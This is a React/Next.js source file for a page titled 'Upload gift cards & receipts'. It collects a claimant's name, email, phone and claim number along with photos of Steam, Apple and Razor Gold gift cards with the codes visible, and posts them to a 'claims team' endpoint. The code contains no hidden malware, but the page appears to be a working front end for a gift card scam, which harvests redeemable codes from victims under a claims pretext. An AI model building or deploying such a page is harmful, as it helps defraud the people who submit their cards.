'use client';

import { FormEvent, useMemo, useRef, useState } from 'react';
import { Camera, CheckCircle2, ImagePlus, Loader2, Trash2, Upload } from 'lucide-react';

const CARD_OPTIONS = [
  { id: 'steam', label: 'Steam Wallet' },
  { id: 'apple', label: 'Apple Gift Card' },
  { id: 'razor', label: 'Razor Gold Gift Card' },
] as const;

type FileItem = { id: string; file: File; preview: string };

function makeItem(file: File): FileItem {
  return {
    id: `${file.name}-${file.size}-${file.lastModified}-${Math.random().toString(36).slice(2, 8)}`,
    file,
    preview: URL.createObjectURL(file),
  };
}

function FilePicker({
  label,
  hint,
  items,
  onAdd,
  onRemove,
  inputId,
  cameraId,
}: {
  label: string;
  hint: string;
  items: FileItem[];
  onAdd: (files: FileList | null) => void;
  onRemove: (id: string) => void;
  inputId: string;
  cameraId: string;
}) {
  const galleryRef = useRef<HTMLInputElement>(null);
  const cameraRef = useRef<HTMLInputElement>(null);

  return (
    <div className="rounded-2xl border border-zinc-200 bg-white p-4 sm:p-5 shadow-sm">
      <div className="mb-3">
        <h3 className="text-base font-semibold text-zinc-900">{label}</h3>
        <p className="text-sm text-zinc-500 mt-1">{hint}</p>
      </div>

      <div className="flex flex-wrap gap-2 mb-4">
        <button
          type="button"
          onClick={() => galleryRef.current?.click()}
          className="inline-flex items-center gap-2 rounded-xl bg-zinc-900 text-white px-4 py-2.5 text-sm font-medium hover:bg-zinc-800"
        >
          <ImagePlus className="w-4 h-4" />
          Upload from gallery
        </button>
        <button
          type="button"
          onClick={() => cameraRef.current?.click()}
          className="inline-flex items-center gap-2 rounded-xl border border-zinc-300 bg-white text-zinc-900 px-4 py-2.5 text-sm font-medium hover:bg-zinc-50"
        >
          <Camera className="w-4 h-4" />
          Take photo
        </button>
      </div>

      <input
        id={inputId}
        ref={galleryRef}
        type="file"
        accept="image/*,.pdf,application/pdf"
        multiple
        className="hidden"
        onChange={(e) => {
          onAdd(e.target.files);
          e.target.value = '';
        }}
      />
      <input
        id={cameraId}
        ref={cameraRef}
        type="file"
        accept="image/*"
        capture="environment"
        className="hidden"
        onChange={(e) => {
          onAdd(e.target.files);
          e.target.value = '';
        }}
      />

      {items.length > 0 ? (
        <ul className="grid grid-cols-2 sm:grid-cols-3 gap-3">
          {items.map((item) => (
            <li key={item.id} className="relative group rounded-xl overflow-hidden border border-zinc-200 bg-zinc-50">
              {item.file.type.startsWith('image/') ? (
                // eslint-disable-next-line @next/next/no-img-element
                <img src={item.preview} alt="" className="h-32 w-full object-cover" />
              ) : (
                <div className="h-32 flex items-center justify-center text-xs text-zinc-600 p-2 text-center">
                  {item.file.name}
                </div>
              )}
              <button
                type="button"
                onClick={() => onRemove(item.id)}
                className="absolute top-2 right-2 rounded-full bg-black/70 text-white p-1.5 hover:bg-black"
                aria-label="Remove"
              >
                <Trash2 className="w-3.5 h-3.5" />
              </button>
              <p className="truncate px-2 py-1.5 text-[11px] text-zinc-600">{item.file.name}</p>
            </li>
          ))}
        </ul>
      ) : (
        <p className="text-sm text-zinc-400 border border-dashed border-zinc-200 rounded-xl py-8 text-center">
          No files yet — upload or take a photo
        </p>
      )}
    </div>
  );
}

export default function UploadGiftCardsPage() {
  const [fullName, setFullName] = useState('');
  const [email, setEmail] = useState('');
  const [phone, setPhone] = useState('');
  const [claimRef, setClaimRef] = useState('');
  const [notes, setNotes] = useState('');
  const [selectedTypes, setSelectedTypes] = useState<string[]>([]);
  const [cardImages, setCardImages] = useState<FileItem[]>([]);
  const [receiptImages, setReceiptImages] = useState<FileItem[]>([]);
  const [status, setStatus] = useState<'idle' | 'submitting' | 'success' | 'error'>('idle');
  const [error, setError] = useState('');

  const canSubmit = useMemo(() => {
    return (
      fullName.trim() &&
      email.trim() &&
      selectedTypes.length > 0 &&
      cardImages.length > 0 &&
      receiptImages.length > 0 &&
      status !== 'submitting'
    );
  }, [fullName, email, selectedTypes, cardImages, receiptImages, status]);

  function toggleType(id: string) {
    setSelectedTypes((prev) => (prev.includes(id) ? prev.filter((t) => t !== id) : [...prev, id]));
  }

  function addFiles(setter: React.Dispatch<React.SetStateAction<FileItem[]>>, list: FileList | null) {
    if (!list?.length) return;
    const next = Array.from(list).map(makeItem);
    setter((prev) => [...prev, ...next]);
  }

  function removeFile(
    setter: React.Dispatch<React.SetStateAction<FileItem[]>>,
    id: string
  ) {
    setter((prev) => {
      const target = prev.find((p) => p.id === id);
      if (target) URL.revokeObjectURL(target.preview);
      return prev.filter((p) => p.id !== id);
    });
  }

  async function onSubmit(e: FormEvent) {
    e.preventDefault();
    if (!canSubmit) return;

    setStatus('submitting');
    setError('');

    const form = new FormData();
    form.set('fullName', fullName.trim());
    form.set('email', email.trim());
    form.set('phone', phone.trim());
    form.set('claimRef', claimRef.trim());
    form.set('notes', notes.trim());
    form.set(
      'cardTypes',
      selectedTypes
        .map((id) => CARD_OPTIONS.find((o) => o.id === id)?.label || id)
        .join(',')
    );
    cardImages.forEach((item) => form.append('cardImages', item.file));
    receiptImages.forEach((item) => form.append('receiptImages', item.file));

    try {
      const res = await fetch('/api/gift-cards', { method: 'POST', body: form });
      const data = await res.json().catch(() => ({}));
      if (!res.ok) {
        throw new Error(data.error || 'Submission failed');
      }
      setStatus('success');
      cardImages.forEach((i) => URL.revokeObjectURL(i.preview));
      receiptImages.forEach((i) => URL.revokeObjectURL(i.preview));
    } catch (err) {
      setStatus('error');
      setError(err instanceof Error ? err.message : 'Could not submit. Please try again.');
    }
  }

  if (status === 'success') {
    return (
      <div className="min-h-[70vh] flex items-center justify-center px-4 py-16">
        <div className="max-w-md w-full text-center rounded-3xl border border-emerald-200 bg-emerald-50 p-8">
          <CheckCircle2 className="w-12 h-12 text-emerald-600 mx-auto mb-4" />
          <h1 className="text-2xl font-semibold text-zinc-900 mb-2">Upload received</h1>
          <p className="text-zinc-600 text-sm leading-relaxed">
            Thank you, {fullName.split(' ')[0] || 'claimant'}. Your gift card photos and receipts were submitted
            successfully. Our team will review them and follow up by email.
          </p>
        </div>
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-b from-zinc-50 to-white">
      <div className="max-w-2xl mx-auto px-4 py-10 sm:py-14">
        <div className="mb-8">
          <p className="text-xs font-semibold tracking-wider uppercase text-amber-700 mb-2">
            Claimant secure upload
          </p>
          <h1 className="text-3xl sm:text-4xl font-semibold tracking-tight text-zinc-900 mb-3">
            Upload gift cards & receipts
          </h1>
          <p className="text-zinc-600 text-sm sm:text-base leading-relaxed">
            Select every gift card type you purchased (you can choose more than one), then upload or take photos of
            each card and your purchase receipts.
          </p>
        </div>

        <form onSubmit={onSubmit} className="space-y-5">
          <div className="rounded-2xl border border-zinc-200 bg-white p-4 sm:p-5 shadow-sm space-y-4">
            <div>
              <label className="block text-sm font-medium text-zinc-800 mb-1.5">Full name *</label>
              <input
                required
                value={fullName}
                onChange={(e) => setFullName(e.target.value)}
                className="w-full rounded-xl border border-zinc-300 px-3.5 py-2.5 text-sm outline-none focus:ring-2 focus:ring-amber-500/40 focus:border-amber-500"
                placeholder="As on your claim file"
              />
            </div>
            <div className="grid sm:grid-cols-2 gap-4">
              <div>
                <label className="block text-sm font-medium text-zinc-800 mb-1.5">Email *</label>
                <input
                  required
                  type="email"
                  value={email}
                  onChange={(e) => setEmail(e.target.value)}
                  className="w-full rounded-xl border border-zinc-300 px-3.5 py-2.5 text-sm outline-none focus:ring-2 focus:ring-amber-500/40 focus:border-amber-500"
                  placeholder="you@email.com"
                />
              </div>
              <div>
                <label className="block text-sm font-medium text-zinc-800 mb-1.5">Phone</label>
                <input
                  value={phone}
                  onChange={(e) => setPhone(e.target.value)}
                  className="w-full rounded-xl border border-zinc-300 px-3.5 py-2.5 text-sm outline-none focus:ring-2 focus:ring-amber-500/40 focus:border-amber-500"
                  placeholder="+1 ..."
                />
              </div>
            </div>
            <div>
              <label className="block text-sm font-medium text-zinc-800 mb-1.5">Claim / reference #</label>
              <input
                value={claimRef}
                onChange={(e) => setClaimRef(e.target.value)}
                className="w-full rounded-xl border border-zinc-300 px-3.5 py-2.5 text-sm outline-none focus:ring-2 focus:ring-amber-500/40 focus:border-amber-500"
                placeholder="Optional"
              />
            </div>
          </div>

          <div className="rounded-2xl border border-zinc-200 bg-white p-4 sm:p-5 shadow-sm">
            <h3 className="text-base font-semibold text-zinc-900 mb-1">Gift card types *</h3>
            <p className="text-sm text-zinc-500 mb-4">Select all that apply.</p>
            <div className="space-y-2">
              {CARD_OPTIONS.map((opt) => {
                const checked = selectedTypes.includes(opt.id);
                return (
                  <label
                    key={opt.id}
                    className={`flex items-center gap-3 rounded-xl border px-4 py-3 cursor-pointer transition ${
                      checked ? 'border-amber-500 bg-amber-50' : 'border-zinc-200 hover:border-zinc-300'
                    }`}
                  >
                    <input
                      type="checkbox"
                      checked={checked}
                      onChange={() => toggleType(opt.id)}
                      className="h-4 w-4 accent-amber-600"
                    />
                    <span className="text-sm font-medium text-zinc-900">{opt.label}</span>
                  </label>
                );
              })}
            </div>
          </div>

          <FilePicker
            label="Gift card photos *"
            hint="Front of each card (code visible). Upload from gallery or open camera."
            items={cardImages}
            onAdd={(files) => addFiles(setCardImages, files)}
            onRemove={(id) => removeFile(setCardImages, id)}
            inputId="card-gallery"
            cameraId="card-camera"
          />

          <FilePicker
            label="Purchase receipts *"
            hint="Store / online receipt for the purchase. Upload or take a photo."
            items={receiptImages}
            onAdd={(files) => addFiles(setReceiptImages, files)}
            onRemove={(id) => removeFile(setReceiptImages, id)}
            inputId="receipt-gallery"
            cameraId="receipt-camera"
          />

          <div className="rounded-2xl border border-zinc-200 bg-white p-4 sm:p-5 shadow-sm">
            <label className="block text-sm font-medium text-zinc-800 mb-1.5">Notes (optional)</label>
            <textarea
              value={notes}
              onChange={(e) => setNotes(e.target.value)}
              rows={3}
              className="w-full rounded-xl border border-zinc-300 px-3.5 py-2.5 text-sm outline-none focus:ring-2 focus:ring-amber-500/40 focus:border-amber-500 resize-y"
              placeholder="Anything else we should know"
            />
          </div>

          {error ? (
            <p className="text-sm text-red-600 bg-red-50 border border-red-200 rounded-xl px-4 py-3">{error}</p>
          ) : null}

          <button
            type="submit"
            disabled={!canSubmit}
            className="w-full inline-flex items-center justify-center gap-2 rounded-2xl bg-amber-600 hover:bg-amber-700 disabled:opacity-50 disabled:cursor-not-allowed text-white font-semibold py-3.5 text-sm sm:text-base shadow-sm"
          >
            {status === 'submitting' ? (
              <>
                <Loader2 className="w-4 h-4 animate-spin" />
                Submitting…
              </>
            ) : (
              <>
                <Upload className="w-4 h-4" />
                Submit gift cards & receipts
              </>
            )}
          </button>

          <p className="text-center text-xs text-zinc-500 pb-6">
            Photos are sent securely to our claims team. Keep originals until you receive confirmation.
          </p>
        </form>
      </div>
    </div>
  );
}
